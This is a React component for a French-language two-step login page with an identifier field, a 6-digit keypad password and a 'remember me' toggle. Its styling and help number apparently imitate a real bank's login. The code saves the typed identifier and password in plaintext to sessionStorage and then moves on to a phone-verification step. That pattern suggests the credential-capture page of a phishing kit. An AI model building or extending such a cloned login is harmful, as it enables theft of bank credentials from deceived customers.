import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Info, X } from 'lucide-react';
import NumericKeypad from '../components/NumericKeypad';

const IdentifierStep = () => {
  const navigate = useNavigate();
  const [identifier, setIdentifier] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [step, setStep] = useState('identifier'); // 'identifier' | 'password'
  const [password, setPassword] = useState('');

  const handleIdentifierChange = (e) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 8);
    setIdentifier(value);
  };

  const handleClearIdentifier = () => {
    setIdentifier('');
  };

  const handleIdentifierSubmit = () => {
    if (identifier.length >= 6) {
      sessionStorage.setItem('securipass_identifier', identifier);
      setStep('password');
    }
  };

  const handleNumberClick = (num) => {
    if (password.length < 6) {
      setPassword(password + num);
    }
  };

  const handleDelete = () => {
    setPassword(password.slice(0, -1));
  };

  const handlePasswordSubmit = () => {
    if (password.length === 6) {
      sessionStorage.setItem('securipass_password', password);
      navigate('/phone-verification');
    }
  };

  return (
    <div className="min-h-screen bg-white py-8 px-4" data-testid="identifier-step">
      <div className="max-w-md mx-auto">
        {step === 'identifier' && (
          <>
            <p className="text-gray-600 text-sm mb-2">Saisissez votre identifiant client</p>

            {/* Text input with X to clear */}
            <div className="relative mb-6">
              <input
                type="text"
                inputMode="numeric"
                autoComplete="off"
                value={identifier}
                onChange={handleIdentifierChange}
                placeholder=""
                data-testid="identifier-input"
                className="w-full border-2 border-[#1a2b6d] rounded-lg px-4 py-3 text-2xl font-bold text-gray-900 bg-white min-h-[56px] pr-12 focus:outline-none focus:ring-2 focus:ring-[#1a2b6d]/30"
              />
              {identifier.length > 0 && (
                <button
                  type="button"
                  onClick={handleClearIdentifier}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 p-1"
                  data-testid="clear-identifier-btn"
                  aria-label="Effacer"
                >
                  <X size={20} />
                </button>
              )}
            </div>

            {/* Se souvenir de moi */}
            <div className="flex items-center gap-3 mb-6">
              <span className="text-gray-600 text-sm">Se souvenir de moi</span>
              <button type="button" className="text-[#1a2b6d]" data-testid="info-remember-btn">
                <Info size={18} />
              </button>
              <button
                type="button"
                onClick={() => setRememberMe(!rememberMe)}
                data-testid="remember-me-toggle"
                className={`relative w-12 h-6 rounded-full transition-colors duration-200 ${
                  rememberMe ? 'bg-green-500' : 'bg-gray-300'
                }`}
                aria-label="Se souvenir de moi"
              >
                <span
                  className={`absolute top-0.5 left-0.5 w-5 h-5 bg-white rounded-full shadow transition-transform duration-200 ${
                    rememberMe ? 'translate-x-6' : ''
                  }`}
                />
              </button>
            </div>

            {/* Valider button */}
            <button
              type="button"
              onClick={handleIdentifierSubmit}
              disabled={identifier.length < 6}
              data-testid="identifier-submit-btn"
              className="w-full py-4 text-lg font-semibold text-white bg-[#e60028] hover:bg-[#c00020] rounded-full transition-all duration-200 shadow-md hover:shadow-lg disabled:opacity-40 disabled:cursor-not-allowed"
            >
              Valider
            </button>

            <div className="mt-8 text-center">
              <p className="text-sm text-gray-500">
                Besoin d'aide ? Contactez le{' '}
                <span className="font-semibold text-[#e60028]">09 69 39 00 00</span>
              </p>
            </div>
          </>
        )}

        {step === 'password' && (
          <>
            <p className="text-gray-600 text-sm mb-2">Saisissez votre identifiant client</p>

            {/* Read-only identifier display */}
            <div className="relative mb-6">
              <div
                className="w-full border-2 border-[#1a2b6d] rounded-lg px-4 py-3 text-2xl font-bold text-gray-900 bg-white min-h-[56px] flex items-center pr-12"
                data-testid="identifier-readonly"
              >
                {identifier}
              </div>
              <button
                type="button"
                onClick={() => {
                  setPassword('');
                  setStep('identifier');
                }}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 p-1"
                data-testid="edit-identifier-btn"
                aria-label="Modifier l'identifiant"
              >
                <X size={20} />
              </button>
            </div>

            <NumericKeypad
              value={password}
              maxLength={6}
              onNumberClick={handleNumberClick}
              onDelete={handleDelete}
              onSubmit={handlePasswordSubmit}
              submitLabel="Valider"
              showAsDashes={true}
              inputLabel=""
            />

            <div className="mt-4 text-center">
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[#e60028] hover:underline text-sm font-medium underline"
                data-testid="activate-sound-keyboard-link"
              >
                Activer le clavier sonore
              </a>
            </div>
          </>
        )}
      </div>
    </div>
  );
};

export default IdentifierStep;
